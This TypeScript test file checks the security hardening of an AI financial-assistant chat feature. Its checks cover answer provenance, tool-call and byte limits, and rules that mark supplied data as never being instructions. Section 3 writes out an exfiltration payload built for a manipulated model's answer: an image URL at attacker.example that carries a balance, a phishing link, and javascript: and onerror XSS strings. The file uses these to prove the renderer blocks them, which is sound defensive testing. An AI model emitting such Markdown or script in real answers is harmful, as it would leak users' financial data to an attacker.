/**
 * lib/ai/conversation/hardening.test.ts — the Conversations hardening contract, without a model.
 *
 * What a manipulated model could reach is decided by code, so it is proven here
 * against the code, with the pre-hardening behaviour as negative control where one
 * exists:
 *   1. explainability — provenance is built from the turn record, sources each
 *      figure (tool path / orientation / user / unsourced), is sealed bound to the
 *      answer it describes, yields to the plan when the cookie is full, and reaches
 *      the next turn as a system record;
 *   2. product identity — every capability line is a registered tool, lifetimes are
 *      the enforced ones, and the record names nothing secret;
 *   3. sinks — answer Markdown loads no image and keeps no external link;
 *      AdviceBanner escapes;
 *   4. resources — byte ceilings, the per-turn tool-call ceiling through the real
 *      turn loop, the two rate windows;
 *   5. data never instructs — the orientation says who wrote it; the instruction
 *      carries the conversation rule; no tool takes an identity.
 *
 * Standalone tsx (house pattern): exits 0/1.
 */

process.env.ENCRYPTION_KEY = 'a'.repeat(64);

import { readFileSync } from 'node:fs';
import path from 'node:path';
import { createElement as h } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import {
  statedFigures, buildProvenance, readProvenance, injectProvenance, provenanceMessage,
  PROVENANCE_MARKER, MAX_FIGURES,
} from './provenance';
import { sealRuntimeStateWithReport, openRuntimeState, MAX_SEALED_CHARS } from './runtime-state';
import { readChatRequest, MAX_MESSAGE_CHARS, MAX_MESSAGE_BYTES, MAX_TRANSCRIPT_BYTES } from './request';
import {
  CAPABILITY_BY_TOOL, CANNOT, memoryFacts, DISCONNECT, BROWSER_TRANSCRIPT_TTL_HOURS, describeFourthMeridian,
} from './product';
import { ORIENTATION_HEADER } from './evidence';
import { Markdown, isSameOriginPath } from '@/components/ai/Markdown';
import { escapeHtml } from '@/components/dashboard/AdviceBanner';
import { TRANSCRIPT_TTL_MS } from '@/components/ai/transcript-cache';
import type { ActiveScenario } from './active-scenario';

let failures = 0;
function check(name: string, cond: boolean, detail?: string): void {
  if (cond) console.log(`  ✓ ${name}`);
  else { failures++; console.error(`  ✗ ${name}${detail ? ` — ${detail}` : ''}`); }
}
const read = (p: string) => readFileSync(path.join(process.cwd(), p), 'utf8');

async function main(): Promise<void> {
  // ════ 1. EXPLAINABILITY ════════════════════════════════════════════════════
  console.log('1. provenance — what the previous answer actually rested on');
  {
    const figs = statedFigures('Runway is 2.93 months: $15,925.25 ÷ $5,438.35. Since 2026-07-01 you saved 52.5% '
      + '(about $41.3k net worth), list item 3, year 2026.');
    const said = figs.map((f) => f.said);
    check('money, decimals and percentages are figures', ['2.93', '$15,925.25', '$5,438.35', '52.5%', '$41.3k'].every((x) => said.includes(x)), said.join(' | '));
    check('dates, years and list numbers are not', !said.some((x) => /2026|^3$|^07|^01/.test(x)), said.join(' | '));
    check('"$41.3k" is as precise as it was said (±$50)', figs.find((f) => f.said === '$41.3k')?.tolerance === 50);

    const toolCalls = [{ name: 'get_baselines', arguments: { spendingWindow: { completeMonths: 3 } },
      result: { runway: { months: 2.928, numerator: 15925.25, denominator: 5438.35 }, savingsRate: 0.525 } }];
    const orientation = `${ORIENTATION_HEADER}\n${JSON.stringify({ current: { liquid: 15925.25, netWorth: 41344.53 } })}`;
    // The exact dogfood case: a prose subtraction after a tool call.
    const p = buildProvenance({ answer: 'After paying $5,000 you would have $10,925.25, about 2.0 months at $5,438.35 a month; '
      + 'today it is 2.93 months and your savings rate is 52.5%. Net worth $41,344.53.',
      toolCalls, orientation, userTexts: ['If I paid $5,000 of my cash toward my cards, how much runway is left?'] });
    const src = (s: string) => p.figures.find((f) => f.said === s)?.source;
    check('a tool figure is sourced to the tool, by path', src('$5,438.35') === 'tool:get_baselines runway.denominator', src('$5,438.35'));
    check('a rounded tool figure is still the tool\'s', src('2.93') === 'tool:get_baselines runway.months', src('2.93'));
    check('a fraction said as a percentage is the tool\'s', src('52.5%') === 'tool:get_baselines savingsRate', src('52.5%'));
    check('an orientation figure is sourced to the orientation', src('$41,344.53') === 'orientation current.netWorth', src('$41,344.53'));
    check('the user\'s own figure is theirs', src('$5,000') === 'you said it', src('$5,000'));
    check('a figure computed in prose is UNSOURCED — the fact the dogfood explanation lacked', src('$10,925.25') === 'unsourced', src('$10,925.25'));
    check('the calls are carried with their arguments, for a faithful re-run',
      p.calls.length === 1 && p.calls[0].tool === 'get_baselines' && JSON.stringify(p.calls[0].args) === '{"spendingWindow":{"completeMonths":3}}');
    const none = buildProvenance({ answer: 'Hello! What would you like to look at?', toolCalls: [], orientation, userTexts: [] });
    const msg = provenanceMessage(none);
    check('"it ran no tool" is said, not left to inference', /it ran no tool/.test(msg) && msg.startsWith(PROVENANCE_MARKER));
    check('the record forbids describing another derivation, or claiming a tool did or did not run',
      /Never describe a different/.test(msg) && /never claim a tool did or did not run/.test(msg));
    const many = buildProvenance({ answer: Array.from({ length: 30 }, (_, i) => `$${i + 100}.25`).join(' '), toolCalls: [], orientation: null, userTexts: [] });
    check(`figures are bounded (${MAX_FIGURES}) and the clip is stated`, many.figures.length === MAX_FIGURES && many.clipped === true);

    // Into the next turn: a trailing system message, replaced not stacked.
    const messages: unknown[] = [{ role: 'system', content: 'instr' }, { role: 'assistant', content: 'a' }];
    injectProvenance(messages, p); injectProvenance(messages, none);
    const records = messages.filter((m) => String((m as { content: string }).content).startsWith(PROVENANCE_MARKER));
    check('one record per turn, the latest', records.length === 1 && (records[0] as { role: string }).role === 'system'
      && /it ran no tool/.test((records[0] as { content: string }).content));
    const engine = read('lib/ai/conversation/engine.ts');
    check('the engine injects the record only when there IS a previous answer', /history\.some\(\(m\) => m\.role === 'assistant'\)\) injectProvenance/.test(engine));
    check('NEGATIVE CONTROL: the replayed history alone is prose — no tool name survives it',
      /if \(m\.role !== 'user' && m\.role !== 'assistant'\) continue;\s*\n\s*messages\.push\(\{ role: m\.role, content: m\.content \}\)/.test(engine));

    // The seal.
    const bind = { userId: 'u1', spaceId: 's1', tail: 'abc' };
    const r = sealRuntimeStateWithReport({ scenario: null, provenance: p }, bind);
    const opened = openRuntimeState(r.sealed, bind);
    check('a provenance-only seal is issued and opens', r.carried === 'FULL' && opened !== null
      && JSON.stringify(opened?.provenance) === JSON.stringify(p));
    check('…bound to the answer it describes (another tail opens nothing)', openRuntimeState(r.sealed, { ...bind, tail: 'other' }) === null);
    check('…and to the user and Space', openRuntimeState(r.sealed, { ...bind, userId: 'u2' }) === null
      && openRuntimeState(r.sealed, { ...bind, spaceId: 's2' }) === null);
    // The plan never pays for the record.
    const bigScenario = { assumptions: { note: 'x'.repeat(1_400) }, result: { r: 'y'.repeat(1_000) } } as unknown as ActiveScenario;
    const bigRecord = { ...p, calls: Array.from({ length: 6 }, () => ({ tool: 'scenario_projection', args: 'z'.repeat(200) })) };
    const r2 = sealRuntimeStateWithReport({ scenario: bigScenario, provenance: bigRecord }, bind);
    const o2 = openRuntimeState(r2.sealed, bind);
    check('when the cookie is full, the record yields and the scenario is kept', r2.carried === 'FULL'
      && (r2.sealed?.length ?? 0) <= MAX_SEALED_CHARS && o2?.scenario !== null && o2?.provenance === 'NOT_CARRIED',
      `${r2.carried} ${r2.sealed?.length} ${JSON.stringify(o2?.provenance)?.slice(0, 40)}`);
    check('…and the next turn is told it could not be carried', /could not be carried/.test(provenanceMessage('NOT_CARRIED')));
    check('a malformed record in a payload is dropped, never trusted', readProvenance({ calls: 'x' }) === null
      && (readProvenance({ calls: [{ tool: 1 }], figures: [{ said: 2 }] }) as { calls: unknown[] } | null)?.calls.length === 0);
  }

  console.log('1b. the prose computation now has an owner');
  {
    const { findTool } = await import('./tools');
    const t = findTool('get_baselines')!;
    const props = (t.parameters as { properties: Record<string, unknown> }).properties;
    check('get_baselines takes a one-off liquidChange', 'liquidChange' in props);
    check('…and its contract says to quote afterLiquidChange, never subtract or divide in prose',
      /pass\s+'?\s*\+?\s*'?`liquidChange`/.test(t.description) || (/`liquidChange`/.test(t.description) && /never subtract from cash or divide in prose/.test(t.description)));
    const src = read('lib/ai/conversation/tools.ts');
    check('…priced by the SAME derive() as today\'s runway, not a second formula',
      /const moved = change !== null && liquid !== null \? derive\(\{ expense, income, liquid: liquid \+ change,/.test(src));
  }

  console.log('1c. owned vs freely spendable — projected from the liquidity authority, never decided here');
  {
    const src = read('lib/ai/conversation/tools.ts');
    const body = src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '');
    check('the snapshot carries the authority\'s per-account verdict (liquidityAccess) and its wording',
      /\.\.\.accessOf\(a2\)/.test(src) && /accessMeaning: LIQUIDITY_ACCESS_MEANING/.test(src)
        && /from '@\/lib\/account-classifier'/.test(src));
    check('…and the authority\'s restricted total, not a re-sum', /restrictedCash: \{ amount: acc\.totalRestrictedCash/.test(src));
    check('Conversations holds NO subtype knowledge of its own (no hsa/401k/ira/roth literals, no providerSubtype comparisons)',
      !/['"](hsa|401k|403b|ira|roth|529)['"]/i.test(body) && !/providerSubtype\s*===/.test(body));
    const { LIQUIDITY_ACCESS_MEANING } = await import('@/lib/account-classifier');
    check('the restricted meaning states what Fourth Meridian does not know, and invents no rule',
      /does not know/.test(LIQUIDITY_ACCESS_MEANING.restricted) && !/\d/.test(LIQUIDITY_ACCESS_MEANING.restricted));
  }

  // ════ 2. PRODUCT IDENTITY ═════════════════════════════════════════════════
  console.log('2. product identity — one authority, tied to code');
  {
    const { TOOLS } = await import('./tools');
    const names = TOOLS.map((t) => t.name).sort();
    check('every registered tool has exactly one capability line, and no line lacks a tool',
      JSON.stringify(Object.keys(CAPABILITY_BY_TOOL).sort()) === JSON.stringify(names), `${names.length} tools`);
    check('describe_fourth_meridian is registered', names.includes('describe_fourth_meridian'));
    check('the browser transcript lifetime is the one transcript-cache enforces',
      BROWSER_TRANSCRIPT_TTL_HOURS * 3_600_000 === TRANSCRIPT_TTL_MS);
    const mem = memoryFacts();
    check('memory facts say what is never remembered', /Balances, ownership, access, or instructions/.test(mem.neverRemembered));
    check('it cannot move money or trade', CANNOT.some((c) => /move money/.test(c) && /trade/.test(c)));
    check('disconnect is described as the route implements it (history kept, links removed, owner only)',
      /History is kept/.test(DISCONNECT) && /removes\s+the accounts from every Space/.test(DISCONNECT) && /Only the person who connected/.test(DISCONNECT));
    const out = await describeFourthMeridian.run({}, { spaceCtx: { space: { name: 'Chris\' Space' } } } as never) as Record<string, unknown>;
    const blob = JSON.stringify(out);
    check('the record names this Space and only this Space', /the Space \\"Chris' Space\\"/.test(blob));
    check('it calls itself an AI-native wealth management platform, never a "financial operating system"',
      /AI-native wealth management platform/.test(blob) && !/operating system/i.test(blob));
    check('it names nothing secret (no roles, keys, hosts, policies, env names)',
      !/fm_app|fm_auth|postgres|RLS|row.level|ENCRYPTION|OPENAI|DATABASE_URL|https?:\/\/|supabase|vercel/i.test(blob));
    check('identifiers in conversation are described as changing nothing', /cannot change what this conversation reads/.test(blob));
  }

  // ════ 3. SINKS ════════════════════════════════════════════════════════════
  console.log('3. output sinks — what a manipulated answer could make the browser do');
  {
    const evil = 'Balance ![s](https://attacker.example/p.png?d=15925) and [verify](https://attacker.example/login) '
      + 'and [x](javascript:alert(1)) and [proto](//attacker.example/x) and [Spending](/dashboard?view=spending)';
    const html = renderToStaticMarkup(h(Markdown, null, evil));
    check('no image is rendered at all (nothing is fetched)', !/<img/i.test(html), html);
    check('…its alt text is shown instead', /\[s\]/.test(html));
    check('no external, protocol-relative or javascript: href survives', !/href="(https?:|\/\/|javascript:)/i.test(html), html);
    check('…their text is still shown', /verify/.test(html) && /proto/.test(html));
    check('a same-site path stays a link', /href="\/dashboard\?view=spending"/.test(html));
    check('isSameOriginPath refuses //host and backslash tricks', !isSameOriginPath('//a.b') && !isSameOriginPath('/\\a.b') && isSameOriginPath('/x'));
    const plain = renderToStaticMarkup(h(ReactMarkdown, null, evil));
    check('NEGATIVE CONTROL: react-markdown\'s defaults DO render the exfiltrating image and link',
      /<img[^>]+attacker\.example/.test(plain) && /href="https:\/\/attacker\.example/.test(plain));
    check('AdviceBanner escapes markup before adding its own', escapeHtml('<img src=x onerror=alert(1)>**b**') === '&lt;img src=x onerror=alert(1)&gt;**b**');
  }

  // ════ 4. RESOURCES ════════════════════════════════════════════════════════
  console.log('4. resources — bounded per request, per turn, per hour');
  {
    const body = (content: string) => ({ messages: [{ role: 'user', content }] });
    check('an English message at the character ceiling is accepted', readChatRequest(body('a'.repeat(MAX_MESSAGE_CHARS))).ok);
    const cjk = String.fromCharCode(0x4e00).repeat(6_000);
    check('6,000 CJK characters (under the character ceiling, 18 KB) are refused by bytes',
      cjk.length < MAX_MESSAGE_CHARS && !readChatRequest(body(cjk)).ok && Buffer.byteLength(cjk) > MAX_MESSAGE_BYTES);
    check('NEGATIVE CONTROL: the character ceiling alone would have admitted them', cjk.length <= MAX_MESSAGE_CHARS);
    const turns = Array.from({ length: 31 }, (_, i) => ({ role: i % 2 ? 'assistant' : 'user', content: 'é'.repeat(2_700) }));
    turns.push({ role: 'user', content: 'q' });
    check(`a transcript over ${MAX_TRANSCRIPT_BYTES} bytes is refused though under the character ceiling`,
      !readChatRequest({ messages: turns }).ok);

    const { executeTurn, MAX_TOOL_CALLS_PER_TURN } = await import('./turn');
    let ran = 0;
    const counting = { name: 'describe_fourth_meridian' };
    void counting;
    const { describeFourthMeridian: d } = await import('./product');
    const original = d.run; d.run = async (a, c) => { ran++; return original(a, c); };
    let hop = 0;
    const flood = async () => {
      hop++;
      if (hop > 2) return { content: 'done', toolCalls: [], raw: { role: 'assistant', content: 'done' }, usage: null, latencyMs: 0, finishReason: 'stop' };
      const toolCalls = Array.from({ length: 40 }, (_, i) => ({ id: `c${hop}-${i}`, name: 'describe_fourth_meridian', arguments: '{}' }));
      return { content: null, toolCalls, raw: { role: 'assistant', content: null, tool_calls: toolCalls }, usage: null, latencyMs: 0, finishReason: 'tool_calls' };
    };
    const rec = await executeTurn({ messages: [], user: 'q', index: 0, model: 'test', toolSchemas: [],
      toolCtx: { spaceId: 's', asOfISO: '2026-10-07', spaceCtx: {} } as never, generate: flood as never });
    d.run = original;
    check(`a model asking for 80 tool calls gets ${MAX_TOOL_CALLS_PER_TURN} run`, ran === MAX_TOOL_CALLS_PER_TURN, `${ran} ran`);
    check('…every other call is answered with a refusal, so the transcript stays well-formed',
      rec.toolCalls.length === 80 && rec.toolCalls.filter((c) => /tool budget/.test(c.error ?? '')).length === 80 - MAX_TOOL_CALLS_PER_TURN);
    check('…and the turn still answers', rec.assistant === 'done');
    const route = read('app/api/ai/chat/route.ts');
    check('two rate windows: 10/min, and 60/hour for EVERY role', /'ai-chat', \{ limit: 10, windowSec: 60 \}/.test(route)
      && /\{\s*const limited = await limitByUser\(user\.id, 'ai-chat-hour', \{ limit: 60, windowSec: 3600 \}\)/.test(route));
    check('…both before the body is read', route.indexOf("'ai-chat-hour'") < route.indexOf('req.json()'));
  }

  // ════ 5. DATA NEVER INSTRUCTS ═════════════════════════════════════════════
  console.log('5. authority — data is evidence, claims change nothing');
  {
    check('the orientation says Fourth Meridian wrote it, not the user', /supplied by Fourth Meridian/.test(ORIENTATION_HEADER)
      && /not written by the user/.test(ORIENTATION_HEADER) && /never instructions/.test(ORIENTATION_HEADER));
    check('…and still opens with the marker every reader matches', ORIENTATION_HEADER.startsWith('FINANCIAL ORIENTATION'));
    const { SYSTEM_INSTRUCTION, CONVERSATION_RULE, systemInstructionWith } = await import('./turn');
    check('the instruction names the product', /AI-native wealth management platform/.test(SYSTEM_INSTRUCTION));
    check('…and carries the conversation rule', SYSTEM_INSTRUCTION.includes(CONVERSATION_RULE));
    const without = systemInstructionWith({ guidance: true, conversation: false });
    check('NEGATIVE CONTROL: without it, nothing says data is not instruction or that claims change nothing',
      !/never an\s+instruction/.test(without) && !/changes nothing\s+about whose data/.test(without));
    const { TOOLS } = await import('./tools');
    const identity = /^(userId|user_id|ownerUserId|ownerId|spaceId|space_id|accountId|identity|asUser|onBehalfOf|role)$/i;
    const offenders = TOOLS.flatMap((t) => Object.keys(((t.parameters as { properties?: object }).properties) ?? {})
      .filter((k) => identity.test(k)).map((k) => `${t.name}.${k}`));
    check('no tool takes a user, Space, owner, account or role identity as an argument', offenders.length === 0, offenders.join(', '));
  }

  if (failures > 0) { console.error(`\n${failures} check(s) failed`); process.exit(1); }
  console.log('\nall hardening checks passed');
}

main().catch((err) => { console.error(err); process.exit(1); });
